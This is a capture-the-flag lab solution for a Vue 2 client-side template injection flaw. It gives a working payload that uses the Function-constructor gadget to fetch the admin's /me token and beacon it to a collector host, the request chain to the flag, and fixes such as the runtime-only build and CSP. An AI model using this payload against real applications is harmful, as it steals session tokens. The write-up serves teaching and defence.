# Solution — Vue 2 Runtime Template Compilation Injection

## The sink

`GET /admin/dashboard` embeds the latest stored widget template in a hidden
`<div id="w">` (HTML-escaped) and compiles it at runtime:

```js
var tpl = document.getElementById('w').textContent; // div textContent decodes the entities back to the raw template
var compiled = Vue.compile(tpl);
new Vue({ el: '#app', render: compiled.render, staticRenderFns: compiled.staticRenderFns });
```

`Vue.compile()` (available in the **full** Vue build) compiles a template string
into a render function. Expressions inside `{{ }}` are evaluated in the
component's scope; Vue 2 wraps them in `with(this){ … }`. This is **client-side
template injection** (CSTI, CWE-79, OWASP A03:2021 – Injection) — the user
controls the template, not just the data.

`html.escape()` renders the `<div>` content as inert text (no HTML/attribute
injection into the page), but `element.textContent` DECODES the entities before
`Vue.compile` runs, so the raw template (quotes and all) reaches the compiler.
(Reading a `<script type="text/x-template">` via `.innerHTML` would NOT decode
entities — a `<div>` read via `.textContent` does.)

## Reaching arbitrary JavaScript

From a Vue expression, `constructor` resolves to `this.constructor` (the Vue
subclass), and `.constructor` is the `Function` constructor:

```
{{ constructor.constructor("<any JS>")() }}
```

## The payload

```html
<span
  >{{ constructor.constructor("fetch('/me').then(r=>r.text()).then(t=>{new
  Image().src='http://collector:9000/report?m='+encodeURIComponent(t)})")() }}</span
>
```

Chain:

```
POST /widget   {"template":"<span>{{ constructor.constructor(\"fetch('/me')…\")() }}</span>"}
# admin bot loads /admin/dashboard → Vue.compile(template) → expression runs →
# fetch('/me') (admin cookie sent) → beacon the token to the collector
GET  /oob/received       # find /report?m=…token…
POST /solve       {"c":"<32 hex>"}     →  FLAG{…}
```

`tests/exploit.py` automates this.

## Why the containment holds

- The collector is on a `backend` network with `internal: true` — no route off
  the host, so the token reaches the in-lab collector and never the internet.
- `/admin/dashboard`, `/me`, and `/internal/bot-login` all require the admin
  session / backend origin, so the CSTI firing in the bot is the only path to
  the token. `risk: low`.

## The fix

1. **Never compile user-supplied templates.** Ship the **runtime-only** Vue build
   (no `Vue.compile`), which cannot compile templates at all, and render user
   data as **text** (`{{ userData }}` in a _trusted_ template, or `.textContent`).
2. If dynamic layout is truly required, use a strict, non-JS allow-list templating
   engine — never one whose expressions reach the host language.
3. A strict `Content-Security-Policy` without `'unsafe-eval'` also breaks the
   `Function`-constructor gadget, since Vue's compiled render uses `new Function`.

> **Framework version:** this lab vendors Vue **2.7.16** (full build). The flaw is
> runtime compilation of untrusted input, which is version-independent; the pinned
> version is served locally because the bot's network is egress-dropped.
